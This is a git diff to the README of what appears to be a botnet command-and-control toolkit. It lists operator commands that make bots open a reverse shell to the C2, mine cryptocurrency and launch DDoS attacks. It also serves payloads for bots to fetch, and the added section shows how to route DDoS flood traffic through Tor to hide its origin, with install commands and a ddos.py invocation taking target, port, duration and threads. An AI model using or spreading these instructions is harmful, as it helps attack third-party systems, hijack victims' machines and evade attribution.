@@ -68,9 +68,6 @@ To serve payloads for bots to fetch:
 cd payloads/
 python3 -m http.server 8000
 ```
-
----
-
 ## Command Syntax
 
 You can interact with connected bots using the terminal interface. Commands include:
@@ -82,6 +79,37 @@ reverse_shell               # Start reverse shell connection to C2 (must be list
 trigger_mine                # Instruct all bots to mine using mine.py
 trigger_ddos                # Instruct all bots to launch DDoS using ddos.py
 ```
+
+Tor Support (Optional)
+
+Built into ddos.py, you can enable routing DDoS traffic through Tor SOCKS5 by setting: 
+
+```bash
+USE_TOR = True
+```
+This uses PySocks to route all flood traffic through 127.0.0.1:9050, the default local Tor proxy.
+
+Install Tor + PySocks:
+
+```bash
+sudo apt install tor
+pip3 install pysocks
+```
+
+Then start Tor:
+
+```bash
+sudo systemctl start tor@default
+```
+
+And run the DDoS module as usual:
+
+```bash
+python3 ddos.py trigger_ddos <target> <port> <duration> <threads> <mode>
+```
+
+
+---
 
 ### Reverse Shell
 
